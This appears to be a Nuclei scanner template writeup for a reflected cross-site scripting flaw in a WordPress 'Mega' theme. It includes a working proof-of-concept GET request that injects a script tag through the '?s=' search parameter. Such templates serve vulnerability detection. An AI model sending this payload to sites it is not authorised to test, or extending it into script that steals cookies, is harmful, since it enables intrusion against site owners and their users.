# Nuclei Template: Mega Wordpress Theme - Cross site scripting
**Template ID:** wp-mega-theme
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`wp-mega-theme.yaml`)

## Vulnerability Information & PoC

## Description
WordPress theme with a 'Mega-Theme' design is vulnerable to a reflected XSS attack through the '?s=' parameter.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/?s=%22%3E%3Cscript%3Ealert(`document.domain`)%3C/script%3E
```

## References
- https://cxsecurity.com/issue/WLB-2021120027
- https://www.zhaket.com/web/megawp-wordpress-theme
